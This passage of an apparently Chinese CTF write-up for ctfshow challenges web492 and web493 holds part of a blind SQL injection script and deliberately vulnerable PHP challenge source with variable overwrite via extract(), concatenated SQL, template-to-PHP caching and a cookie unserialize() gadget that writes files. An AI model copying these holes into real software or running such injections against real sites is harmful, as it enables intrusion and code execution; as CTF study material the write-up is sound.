invoke__">get</span>(url,params=params)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username&quot;</span>  in r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="title function_ invoke__">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="web492"><a href="#web492" class="headerlink" title="web492"></a>web492</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 12:16:25</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">		<span class="variable">$user</span>=db::<span class="title function_ invoke__">select_one_array</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 13:37:14</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;！--&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;--&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-10 12:12:00</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">		 <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">		 <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		 <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable">$addr</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$database</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>templates&#x2F;index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> Author: h1xa</span><br><span class="line"> Date:   <span class="number">2021</span>-<span class="number">03</span>-<span class="number">08</span> <span class="number">16</span>:<span class="number">54</span>:<span class="number">39</span></span><br><span class="line"> Last Modified by:   h1xa</span><br><span class="line"> Last Modified time: <span class="number">2021</span>-<span class="number">03</span>-<span class="number">09</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">04</span></span><br><span class="line"> email: h1xa@ctfer.com</span><br><span class="line"> link: https:<span class="comment">//ctfer.com</span></span><br><span class="line"> path /templates/index.php</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;CTFshow 新手入门题目 &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&#123;&#123;username&#125;&#125;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/^[A-Za-z0-9]+$/	表示匹配以数字字母开头结尾中间全是数字字母</span><br></pre></td></tr></table></figure>

<p>那么这里简单变量覆盖就可,但是要注意一下将它的注释进行闭合</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411200031843.png" alt="image-20220411200031843"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411200106381.png" alt="image-20220411200106381"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411200118887.png" alt="image-20220411200118887"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411200135182.png" alt="image-20220411200135182"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411200208135.png" alt="image-20220411200208135"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411201037379.png" alt="image-20220411201037379"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411201043845.png" alt="image-20220411201043845"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220411201050704.png" alt="image-20220411201050704"></p>
<h1 id="web493"><a href="#web493" class="headerlink" title="web493"></a>web493</h1><p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 15:43:51</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:23:33</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/render_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;render/db_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">		<span class="variable">$c</span>=<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">		<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$c</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">			template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:index.php?action=login&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">die</span>();	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;check&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z0-9]+$/&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;select username from user where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>).<span class="string">&quot;&#x27; order by id limit 1&quot;</span>;</span><br><span class="line">		<span class="variable">$db</span>=<span class="keyword">new</span> <span class="title class_">db</span>();</span><br><span class="line">		<span class="variable">$user</span>=<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">select_one</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$user</span>)&#123;</span><br><span class="line">		<span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$user</span>);</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;clear&#x27;</span>)&#123;</span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf cache/*&#x27;</span>);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;cache clear&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	template<span class="title class_">Util</span>::<span class="title function_ invoke__">render</span>(<span class="variable">$action</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;render_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:52:18</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 15:52:18</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;file_class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;cache_class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">templateUtil</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(cache::<span class="title function_ invoke__">cache_exists</span>(<span class="variable">$template</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> cache::<span class="title function_ invoke__">get_cache</span>(<span class="variable">$template</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=file<span class="title class_">Util</span>::<span class="title function_ invoke__">read</span>(<span class="string">&#x27;templates/&#x27;</span>.<span class="variable">$template</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="variable">$cache</span>=template<span class="title class_">Util</span>::<span class="title function_ invoke__">shade</span>(<span class="variable">$templateContent</span>,<span class="variable">$arg</span>);</span><br><span class="line">			cache::<span class="title function_ invoke__">create_cache</span>(<span class="variable">$template</span>,<span class="variable">$cache</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$cache</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span>  <span class="function"><span class="keyword">function</span> <span class="title">shade</span>(<span class="params"><span class="variable">$templateContent</span>,<span class="variable">$arg</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">			<span class="variable">$templateContent</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;&#123;&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&lt;！--&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;--&gt;&#x27;</span>, <span class="variable">$templateContent</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$templateContent</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>render&#x2F;db_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 20:43:40</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-12 17:43:56</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$port</span>=<span class="string">&#x27;3306&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$addr</span>=<span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="keyword">new</span> <span class="title class_">dbLog</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getConnection</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		 </span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">mysqli</span>(<span class="variable language_">$this</span>-&gt;addr,<span class="variable language_">$this</span>-&gt;username,<span class="variable language_">$this</span>-&gt;password,<span class="variable language_">$this</span>-&gt;database);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_object</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">select_one_array</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;sql=<span class="variable">$sql</span>;</span><br><span class="line">		<span class="variable">$conn</span> = db::<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">		<span class="variable">$result</span>=<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log-&gt;<span class="title function_ invoke__">log</span>(<span class="variable language_">$this</span>-&gt;sql);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbLog</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$log</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;log=<span class="string">&#x27;log/&#x27;</span>.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d&quot;</span>).<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$sql</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;content = <span class="variable language_">$this</span>-&gt;content.<span class="title function_ invoke__">date_format</span>(<span class="title function_ invoke__">date_create</span>(),<span class="string">&quot;Y-m-d-H-i-s&quot;</span>).<span class="string">&#x27; &#x27;</span>.<span class="variable">$sql</span>.<span class="string">&#x27; \r\n&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable language_">$this</span>-&gt;log, <span class="variable language_">$this</span>-&gt;content,FILE_APPEND);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>&#x2F;render&#x2F;file_class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-03-08 17:56:41</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-03-09 14:08:48</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fileUtil</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span 